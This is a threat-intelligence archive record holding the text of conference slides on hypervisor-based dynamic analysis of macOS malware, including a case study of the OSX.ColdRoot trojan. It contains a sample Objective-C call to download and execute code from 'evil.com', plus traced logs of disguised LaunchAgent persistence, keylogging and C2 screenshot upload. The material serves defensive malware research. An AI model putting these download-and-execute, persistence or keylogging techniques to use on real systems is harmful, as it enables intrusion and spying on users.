{
    "id": "6c07d6b0-c3c6-4384-9573-feec8400c286",
    "created_at": "2022-10-25T16:48:23.744633Z",
    "updated_at": "2025-03-27T02:05:37.172279Z",
    "deleted_at": null,
    "sha1_hash": "cb720b8c80227ecee3347f4a61af110149732563",
    "title": "slides",
    "authors": "",
    "file_creation_date": "2019-06-02T13:59:19Z",
    "file_modification_date": "2019-06-02T13:59:19Z",
    "file_size": 5931206,
    "plain_text": "### Hypervisor-based Analysis of macOS Malware\n\n###### Felix Seele\n\n\n-----\n\n###### whoami\n\n\n###### @c1truz_\n\n\n-----\n\n###### Structure of this Talk\n\n##### Why?\n###### Motivation\n\n\n##### How?\n###### Background\n\n\n##### Challenges\n###### Virtual Machine Introspection\n\n\n-----\n\n###### The Marketing Pitch\n\n\n-----\n\n###### State of the Art\n\n ‚Ä¢ Many tools to monitor different\n aspects of the system: - ProcInfo, BlockBlock\n\n - dtrace (fs_usage, dtruss, ‚Ä¶)\n\n - Firewalls\n\n - Debugger\n\n ‚úó No function call tracer\n (like ltrace)\n\n ‚úó Tools run inside analysis VM\n\n ‚úó No automation\n\n\n## =>\n\n\n\n###### ‚Ä¢ Full visibility of function calls at every level (soundness)\n\n ‚Ä¢ Isolation & Transparency\n\n ‚Ä¢ Efficiency & Automation\n\n\n-----\n\n###### Full Visibility of Function Calls\n\n\n###### kernel\n\n\n###### kernelspace\n\n\n-----\n\n###### Isolation & Performance\n\n\n-----\n\n|PT|Col2|\n|---|---|\n|||\n|r-x||\n|||\n\n\n###### Address translation 101 (x86_64)\n\n\n-----\n\n|PT|Col2|\n|---|---|\n|||\n|rw-||\n|||\n\n\n###### Address translation 101 (x86_64)\n\n\n-----\n\n###### Second-level page tables\n\n\n###### Guest Virtual\n Memory\n\n\n###### Guest Physical\n Memory\n\n\n###### Host Physical\n Memory\n\n\n-----\n\n###### Second-level page tables\n\n\n###### Guest Virtual\n Memory\n\n\n###### Guest Physical\n Memory\n\n\n###### Host Physical\n Memory\n\n\n-----\n\n###### Using TDP to monitor API calls\n\n\n###### - Set B: System libraries and kernel\n\n\n###### CFNetwork.framework\n\n\n###### libsystem_kernel.dylib\n\n\n###### kernel\n\n\n-----\n\n###### Using TDP to monitor API calls\n\n\n###### - Set B: System libraries and kernel\n\n ‚Ä¢ One of the sets is\n executable, the other non-executable\n\n\n### ‚úó\n\n\n###### CFNetwork.framework\n\n\n###### libsystem_kernel.dylib\n\n\n###### kernel\n\n\n-----\n\n###### Using TDP to monitor API calls\n\n\n###### - Set B: System libraries and kernel\n\n ‚Ä¢ One of the sets is\n executable, the other non-executable\n\n\n### ‚úó\n\n\n###### CFNetwork.framework\n\n\n###### libsystem_kernel.dylib\n\n\n###### kernel\n\n\n-----\n\n###### Using TDP to monitor API calls\n\n\n###### executable, the other non-executable\n\n\n### ‚úó\n\n\n###### kernel\n\n\n-----\n\n###### Summary\n\n\n###### - Not detectable, even from the kernel\n\n ‚Ä¢ Efficiency: Calls are intercepted at the highest level possible\n - Preserves high-level semantics\n\n - Simplifies behavior analysis\n\n\n-----\n\n# Virtual Machine Introspection\n\n\n-----\n\n###### The basics\n\n\n###### Process information\n\n\n-----\n\n###### Extracting function call parameters\n\n\n###### Arguments in rdx, rcx, r8, ‚Ä¶ Instance Method Pointer to object in rdi\n\n ‚Ä¢ Need to know the class to extract value\n\n ‚Ä¢ Can‚Äôt trust the function prototype (class clusters, protocols)\n\n => Need to determine class at runtime\n\n\n###### NSString\n\n NSCFString   NSPathStore2\n\n NSCFConstantString\n\n\n-----\n\n###### Finding an object‚Äôs class\n\n\n###### #define ISA_MASK 0x00007ffffffffff8ULL struct { ‚Äú__NSCFConstantString‚Äù\n uintptr_t nonpointer : 1; uintptr_t has_as4 pointer derefs and 1 string read soc : 1; uintptr_t has_cxx_dtor : 1; uintptr_t shiftcls : 44; uintptr_t magic : 6;\n struct class_ro_t {\n uintptr_t weakly_referenced : 1;\n uint32_t flags; // +0x00\n uintptr_t deallocating : 1;\n // ...\n uintptr_t has_sidetable_rc : 1;\n const char *name; // +0x18\n uintptr_t extra_rc : 8;\n }\n };\n\n\n###### // Class ISA; Class superclass; // +0x08 cache_t cache; // +0x10 class_data_bits_t bits; // +0x20 }\n\n struct class_rw_t { uint32_t flags; // +0x00 uint32_t version; // +0x04 const class_ro_t *ro; // +0x08 // ... }\n\n\n###### üëé\n\n\n-----\n\n###### Finding an object‚Äôs class (the efficient way)\n\n\n###### __DATA     00007fff87e12000-00007fff87f55000  rw-/rwx SM=COW      /System/Library/Frameworks/CoreFoundation.framework/Versions/A/CoreFoundation\n\n __DATA + 0x1351D8\n\n 000000000057a340 s _OBJC_CLASS_$___NSCFCharacterSet 000000000057a1d8 s _OBJC_CLASS_$___NSCFConstantString 000000000057a390 s _OBJC_CLASS_$___NSCFData 000000000057a020 s _OBJC_CLASS_$___NSCFDictionary\n\n\n-----\n\n###### Finding an object‚Äôs class (the efficient way)\n\n\n\n###### ‚Ä¢ Next: Reconstruct the objects internal data representation\n - Fairly straightforward for CoreFoundation (open-source)\n\n - Needs to be done for every class that should be reconstructed from the hypervisor\n\n ‚Ä¢ Idea: Automatically extract even unknown classes using Objective-C‚Äôs ivar information\n\n\n-----\n\n###### Example\n\n\nNSString *username = [processInfo userName];\n\nNSFileManager *filemgr = [NSFileManager defaultManager];\nNSString *filename = [[filemgr currentDirectoryPath]\n\nstringByAppendingPathComponent:@\"user.txt\"];\n\n[username writeToFile:filename\n\natomically:YES\n\nencoding:NSStringEncodingConversionAllowLossy\n\nerror:nil];\n\nNSLog(@\"Content written to path: %@\\n\", filename);\n\n\nreturned 488\n\n[0045.706] NSLog (format=\"Process ID is: %d\")\n\n[0045.706] -[NSProcessInfo<0x7f9a3740d080> userName]\n\nreturned=\"xsbgsz‚Äù\n\n[0045.824] +[NSFileManager defaultManager]\n\nreturned 0x7f9a37402850\n\n[0045.824] -[NSFileManager<0x7f9a37402850> currentDirectoryPath]\n\nreturned=\"/Users/xsbgsz\"\n\n[0045.916] -[NSString<0x7f9a3740d150> stringByAppendingPathComponent:\"user.txt\"]\n\nreturned=\"/Users/xsbgsz/user.txt‚Äù\n\n[0045.916] -[NSString<0x7a736762737865> writeToFile:\"/Users/xsbgsz/user.txt\"\n\natomically:1 encoding:0x1 error:0x0]\nreturned 1\n\n( )\n\n\n-----\n\n###### Inter Process Communication\n\n|CFPort|MIG|XPC messages|\n|---|---|---|\n\n\n###### Mach messages\n\n\n###### - Remote Procedure Calls\n\n - ...\n\n ‚Ä¢ Used by > 90% of samples\n\n ‚Ä¢ Can be used to evade dynamic malware\n analysis systems\n\n\n-----\n\n###### Persistence\n\n\n###### Place plist in ~/Library/LaunchAgents\n\n [0047.999] +[NSData(NSData) dataWithBytes:0x100019a40 length:0x201] returned 0x10010c3a0*\n [0050.489] -[NSData(NSData)<0x10010c3a0> writeToFile:\"/Users/Shared/com.apple.updates.plist\" atomically:1]\n returned 1\n [0050.493] system (command=\"cp /Users/Shared/com.apple.updates.plist $HOME/Library/LaunchAgents/\")\n returned 0\n\n Start LaunchAgent using ‚Äùlaunchctl load ‚Äìw‚Äù\n\n [0059.997] execve (file=\"/bin/launchctl\", argv=([0]=\"launchctl\", [1]=\"load\", [2]=\"-w\",\n\n [3]=\"/Users/xsbgsz/Library/LaunchAgents/com.apple.updates.plist\"), envp=(...))\n\n\n-----\n\n###### Persistence\n\n\n###### launchctl:\n [0054.506] xpc_dictionary_create (keys=0x0, values=0x0, count=0x0) returned 0x7faacbc029e0     \n [0054.521] xpc_dictionary_set_uint64 (xdict=0x7faacbc029e0, key=\"type\", value=0x7)\n [0054.521] xpc_dictionary_set_uint64 (xdict=0x7faacbc029e0, key=\"handle\", value=0x0)\n [0054.521] xpc_dictionary_set_mach_send (dictionary=0x7faacbc029e0, name=\"domain-port\", port=0x707)\n [0054.521] xpc_dictionary_set_string (xdict=0x7faacbc029e0, key=\"session\", string=\"Aqua\")\n [0054.521] xpc_dictionary_set_bool (xdict=0x7faacbc029e0, key=\"legacy\", value=1)\n [0054.522] xpc_array_create (objects=0x0, count=0x0) returned 0x7faacbc02d00\n [0054.522] xpc_array_set_string (xarray=0x7faacbc02d00, index=0xffffffffffffffff,\n string=\"/Users/xsbgsz/Library/LaunchAgents/com.apple.updates.plist\")\n [0054.522] xpc_dictionary_set_value (xdict=0x7faacbc029e0, key=\"paths\", value=0x7faacbc02d00)\n [0054.522] xpc_dictionary_set_bool (xdict=0x7faacbc029e0, key=\"enable\", value=1)\n [0054.522] xpc_dictionary_set_uint64 (xdict=0x7faacbc029e0, key=\"subsystem\", value=0x3)\n [0054.522] xpc_dictionary_set_uint64 (xdict=0x7faacbc029e0, key=\"routine\", value=0x320)\n [0054 522] xpc pipe routine (pipe=0x7faacbc02390 request=0x7faacbc029e0 reply=0x7ffeef6b53c0) returned 0\n\n\n-----\n\n###### Spawning processes\n\n\n###### \"subsystem\": 7, \"handle\": 0, \"routine\": 100, \"type\": 7, \"request\": {\n \"SubmitJob\": {\n \"EnvironmentVariables\": {...}, \"Label\": \"com.apple.calculator.656\", \"POSIXSpawnType\": \"App\", \"LaunchOnlyOnce\": true, \"WorkingDirectory\": \"/\", \"ProgramArguments\": [\"/Applications/Calculator.app/Contents/MacOS/Calculator\"], <‚Ä¶> } } }\n\n\n-----\n\n###### Remote Procedure Calls using NSXPCConnection\n\n\n###### Code:\n\nNSXPCConnection *conn = [[NSXPCConnection alloc] initWithServiceName:@\"com.evil.xpc-downloader\"];\nconn.remoteObjectInterface = [NSXPCInterface interfaceWithProtocol:@protocol(xpc_downloaderProtocol)];\n\n[conn resume];\n\n[[conn remoteObjectProxy] downloadAndExecute:@\"http://evil.com/malware\" withReply:^(NSString *reply) {\n\nNSLog(@\"Reply: %@\", reply);\n}];\n\n###### XPC message:\n\n\n{\n\n\n\"f\": 33,\n\"root\": <data 116 bytes>,\n\"proxynum\": 1,\n\"replysig\": v16@?0@\"NSString\"8\n\n\n###### Serialized invocation, encoded in undocumented bplist16 format\n\n\n-----\n\n###### Demo\n\n\n\n###### [496] Added pending xpc target with ipc_port_addr 0xffffff800fe1fa40 <...>\n [1] launchd launched service com.evil.xpc-downloader\n [1] resolved pending entry with id 1: pid: 499, \"xpc_downloader\"\n [499] Detected new target process: xpc_downloader\n [499, 4772] Execution started @ 0x1021ae7d0\n\n <...>\n [499, 4773] +[NSTask allocWithZone:0x0] returned 0x7fde0fc14200\n [499, 4773] -[NSConcreteTask<0x7fde0fc14200> init] returned 0x7fde0fc14200\n [499, 4773] -[NSConcreteTask<0x7fde0fc14200>\n setLaunchPath:\"/Applications/Calculator.app/Contents/MacOS/Calculator\"]\n [499, 4773] [NSConcreteTask<0x7fde0fc14200> launch]\n\n\n-----\n\n# Case Study OSX.ColdRoot\n\n\n# Case Study OSX.ColdRoot\n\n\n-----\n\n###### OSX.ColdRoot\n\n ‚Ä¢ Remote Access Trojan, discovered by Patrick Wardle\n\n ‚Ä¢ Written in Pascal\n\n ‚Ä¢ Capabilities:\n - File operations (list, rename, delete)\n\n - Process operations (list, kill)\n\n - Run shell command (not implemented)\n\n - Download to and from victim\n\n - Keylogging\n\n - Remote Desktop (screenshots)\n\n ‚Ä¢ C2 is down\n write own C2 server :)\n\n\n-----\n\n###### Accessibility DB\n\n\n###### ‚ÄúPrivilege escalation‚Äù and persistence\n\n\n###### I t ll\n\n\n-----\n\n###### Keylogger\n\n\n###### userInfo=0x0) returned 0x509d50\n [0034.805] CFMachPortCreateRunLoopSource (allocator=0x0, port=0x509d50, order=0) returned 0x50ff20\n [0034.805] CFRunLoopGetCurrent () returned 0x5123c0\n [0034.806] CFRunLoopAddSource (rl=0x5123c0, source=0x50ff20, mode=\"kCFRunLoopCommonModes\")\n [0034.807] SLEventTapEnable (tap=0x509d50, enable=1)\n [0034.807] CFRunLoopRun ()\n kCGKeyboardEventKeycode\n // on keypress: get keycode\n [0088.346] SLEventGetIntegerValueField (event=0x53a580, field=0x9) returned 36\n [0088.346] SLEventKeyboardGetUnicodeString (event=0x53a580, maxStringLength=0xa,\n actualStringLength=0xb0579d48, unicodeString=0xb0579d4e)\n\n // write to log\n [0088.349] open (path=\"/private/var/tmp/adobe_logs.log\", oflag=9) returned 3\n [0088.350] __ioctl (fildes=3, request=0x402c7413) returned -1\n [0088.350] bcopy (src=0x31b704c, dst=0xb0579bc0, len=0xa)\n [0088.350] __write_nocancel (fildes=3, buf=0xb0579bc0*, nbyte=0xa) returned 10\n [0088.350] __close_nocancel (fildes=3) returned 0\n\n\n-----\n\n###### Remote Desktop\n\n\n###### // send to C2\n [0037.851] socket (domain=2, type=1, protocol=0) returned 4\n [0037.857] connect (sockfd=4, addr=0xb1189df0*(sin_len=0x10, sin_family=0x2, sin_port=0x3419,\n sin_addr=\"WW.XX.YY.ZZ\"), addrlen=0x10) returned 0 <‚Ä¶>\n [0040.638] send (socket=4, buffer=0x320f028*, length=0x4, flags=0) returned 4 <‚Ä¶>\n [0040.640] send (socket=4, buffer=0x35a2d18*, length=0x3beec, flags=0) returned 245484\n\n\n###### 00000000 ff d8 ff e0 00 10 4a 46 49 46 00 01 01 00 00 01 |......JFIF......| 00000010 00 01 00 00 ff db 00 43 00 01 01 01 01 01 01 01 |.......C........| 00000020 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 | |\n\n\n-----\n\n###### Conclusions\n\n ‚Ä¢ Automated, dynamic malware analysis helps to cope with rising number of\n macOS malware samples\n\n ‚Ä¢ Hypervisor-based methods provide strong isolation\n\n ‚Ä¢ TDP can be (ab)used to efficiently monitor function calls\n\n ‚Ä¢ Monitoring all aspects of malware execution requires in-depth knowledge\n\n ‚Ä¢ Inter-process communication can be used by evasive malware to trick\n dynamic analysis systems\n\n\n-----\n\n#### Thank you for your attention!\n\n###### Thanks to:\n\n ‚Ä¢ Patrick Wardle, objective-see.com\n ‚Ä¢ Jonathan Levin, *OS Internals, newosxbook.com\n\n\n#### Thank you for your attention!\n\n###### Thanks to:\n\n ‚Ä¢ Patrick Wardle, objective-see.com\n ‚Ä¢ Jonathan Levin, *OS Internals, newosxbook.com\n\n ‚Ä¢ Icons from iconfinder.com\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "bf5be533-fa31-4590-ae37-5761c97ffa34",
            "created_at": "2022-10-25T16:13:58.389257Z",
            "updated_at": "2022-10-25T16:13:58.389257Z",
            "deleted_at": null,
            "name": "Malpedia",
            "url": "https://malpedia.caad.fkie.fraunhofer.de",
            "description": "Malpedia is a free service offered by Fraunhofer FKIE",
            "reports": null
        }
    ],
    "references": [
        "https://objectivebythesea.com/v2/talks/OBTS_v2_Seele.pdf"
    ],
    "report_names": [
        "OBTS_v2_Seele.pdf"
    ],
    "threat_actors": [
        {
            "id": "d90307b6-14a9-4d0b-9156-89e453d6eb13",
            "created_at": "2022-10-25T16:07:23.773944Z",
            "updated_at": "2025-03-27T02:02:09.974695Z",
            "deleted_at": null,
            "main_name": "Lead",
            "aliases": [
                "Casper",
                "TG-3279"
            ],
            "source_name": "ETDA:Lead",
            "tools": [
                "Agentemis",
                "BleDoor",
                "Cobalt Strike",
                "CobaltStrike",
                "RbDoor",
                "RibDoor",
                "Winnti",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1666716503,
    "ts_updated_at": 1743041137,
    "ts_creation_date": 1559483959,
    "ts_modification_date": 1559483959,
    "files": {
        "pdf": "https://archive.orkl.eu/cb720b8c80227ecee3347f4a61af110149732563.pdf",
        "text": "https://archive.orkl.eu/cb720b8c80227ecee3347f4a61af110149732563.txt",
        "img": "https://archive.orkl.eu/cb720b8c80227ecee3347f4a61af110149732563.jpg"
    }
}